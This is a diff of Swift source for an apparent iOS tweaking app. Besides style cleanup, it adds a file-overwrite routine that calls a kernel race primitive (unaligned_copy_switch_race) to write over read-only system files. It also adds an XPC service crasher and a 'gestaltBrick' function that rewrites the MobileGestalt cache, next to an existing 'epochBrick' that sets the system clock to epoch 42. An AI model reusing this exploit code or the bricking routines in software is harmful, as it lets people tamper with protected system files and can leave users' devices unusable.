@@ -11,16 +11,16 @@ import ZIPFoundation
 
 func getDataDir(bundleID: String) -> URL {
     let fm = FileManager.default
-    var returnedurl = URL.init(string: "none")
+    var returnedurl = URL(string: "none")
     var dirlist = [""]
-    
+
     do {
         dirlist = try fm.contentsOfDirectory(atPath: "/var/mobile/Containers/Data/Application")
         print(dirlist)
     } catch {
         UIApplication.shared.alert(body: "Could not access /var/mobile/Containers/Data/Application")
     }
-    
+
     for dir in dirlist {
         print(dir)
         let mmpath = "/var/mobile/Containers/Data/Application/" + dir + "/.com.apple.mobile_container_manager.metadata.plist"
@@ -28,7 +28,7 @@ func getDataDir(bundleID: String) -> URL {
         let mmDict = NSDictionary(contentsOfFile: mmpath)
         print(mmDict as Any)
         if mmDict!["MCMMetadataIdentifier"] as! String == bundleID {
-            returnedurl = URL.init(string: "/var/mobile/Containers/Data/Application")!.appendingPathComponent(dir)
+            returnedurl = URL(string: "/var/mobile/Containers/Data/Application")!.appendingPathComponent(dir)
         }
     }
     return returnedurl!
@@ -71,14 +71,15 @@ func openInSantander(path: String) {
 // thanks bing ai
 func openInFilza(path: String) {
     UIApplication.shared.open(URL(string: "filza://\(path)")!, options: [:], completionHandler: nil)
-}       
+}
 
-func delDirectoryContents(path: String) {
-    var contents: [String] = [""]
+func delDirectoryContents(path: String) -> Bool {
+    var contents = [""]
     do {
         contents = try FileManager.default.contentsOfDirectory(atPath: path)
     } catch {
         UIApplication.shared.alert(body: "Could not get contents of directory?!")
+        return false
     }
     if contents != [""] {
         for file in contents {
@@ -88,13 +89,16 @@ func delDirectoryContents(path: String) {
                 print("Probably deleted \(file)")
                 UIApplication.shared.alert(title: "Success", body: "Successfully deleted!")
                 Haptic.shared.notify(.success)
+                return true
             } catch {
                 print("Failed to delete \(file)")
                 UIApplication.shared.alert(body: "Could not remove file \(file)")
                 Haptic.shared.notify(.error)
+                return false
             }
         }
     }
+    return false
 }
 
 // from stackoverflow
@@ -106,7 +110,7 @@ func openApp(bundleID: String) -> Bool {
 }
 
 func epochBrick() {
-    let myInt: Int = 42
+    let myInt = 42
 
     // Create a pointer to the integer
     withUnsafePointer(to: myInt) { intPointer in
@@ -114,11 +118,127 @@ func epochBrick() {
         let timevalpointer = intPointer.withMemoryRebound(to: timeval.self, capacity: 1) {
             UnsafePointer<timeval>($0)
         }
-        
+
         let timezonepointer = intPointer.withMemoryRebound(to: timezone.self, capacity: 1) {
             UnsafePointer<timezone>($0)
         }
         // Do a little trolling
         settimeofday(timevalpointer, timezonepointer)
     }
+}
+
+// MARK: - plist editing function
+
+func plistChange(plistPath: String, key: String, value: Int) -> Bool {
+    var plist: [String : Any]? = nil
+    print("plistChange() called")
+    let stringsData = try! Data(contentsOf: URL(fileURLWithPath: plistPath))
+    do {
+        plist = try PropertyListSerialization.propertyList(from: stringsData, options: [], format: nil) as! [String: Any]
+    } catch {
+        return false
+    }
+    func changeValue(_ dict: [String: Any], _ key: String, _ value: Int) -> [String: Any] {
+        var newDict = dict
+        for (k, v) in dict {
+            if k == key {
+                newDict[k] = value
+            } else if let subDict = v as? [String: Any] {
+                newDict[k] = changeValue(subDict, key, value)
+            }
+        }
+        print(newDict)
+        return newDict
+    }
+
+    var newPlist = plist
+    newPlist = changeValue(newPlist!, key, value)
+
+    let newData = try! PropertyListSerialization.data(fromPropertyList: newPlist, format: .binary, options: 0)
+    print(newData)
+
+    return overwriteFileWithDataImpl(originPath: plistPath, replacementData: newData)
+}
+
+func overwriteFileWithDataImpl(originPath: String, replacementData: Data) -> Bool {
+    #if false
+        let documentDirectory = FileManager.default.urls(
+            for: .documentDirectory,
+            in: .userDomainMask
+        )[0].path
+
+        let pathToRealTarget = originPath
+        let originPath = documentDirectory + originPath
+        let origData = try! Data(contentsOf: URL(fileURLWithPath: pathToRealTarget))
+        try! origData.write(to: URL(fileURLWithPath: originPath))
+    #endif
+
+    // open and map original font
+    let fd = open(originPath, O_RDONLY | O_CLOEXEC)
+    if fd == -1 {
+        print("Could not open target file")
+        return false
+    }
+    defer { close(fd) }
+    // check size of font
+    let originalFileSize = lseek(fd, 0, SEEK_END)
+    guard originalFileSize >= replacementData.count else {
+        print("Original file: \(originalFileSize)")
+        print("Replacement file: \(replacementData.count)")
+        print("File too big!")
+        return false
+    }
+    lseek(fd, 0, SEEK_SET)
+
+    // Map the font we want to overwrite so we can mlock it
+    let fileMap = mmap(nil, replacementData.count, PROT_READ, MAP_SHARED, fd, 0)
+    if fileMap == MAP_FAILED {
+        print("Failed to map")
+        return false
+    }
+    // mlock so the file gets cached in memory
+    guard mlock(fileMap, replacementData.count) == 0 else {
+        print("Failed to mlock")
+        return true
+    }
+
+    // for every 16k chunk, rewrite
+    print(Date())
+    for chunkOff in stride(from: 0, to: replacementData.count, by: 0x4000) {
+        print(String(format: "%lx", chunkOff))
+        let dataChunk = replacementData[chunkOff..<min(replacementData.count, chunkOff + 0x4000)]
+        var overwroteOne = false
+        for _ in 0..<2 {
+            let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
+                unaligned_copy_switch_race(
+                    fd, Int64(chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count
+                )
+            }
+            if overwriteSucceeded {
+                overwroteOne = true
+                print("Successfully overwrote!")
+                break
+            }
+            print("try again?!")
+        }
+        guard overwroteOne else {
+            print("Failed to overwrite")
+            return false
+        }
+    }
+    print(Date())
+    print("Successfully overwrote!")
+    return true
+}
+
+func xpc_crash(_ serviceName: String) {
+    let buffer = UnsafeMutablePointer<CChar>.allocate(capacity: serviceName.utf8.count)
+    defer { buffer.deallocate() }
+    strcpy(buffer, serviceName)
+    xpc_crasher(buffer)
+}
+
+func gestaltBrick() -> Bool {
+    // do even more trollage
+    return plistChange(plistPath: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", key: "ArtworkDeviceSubType", value: 0)
 }
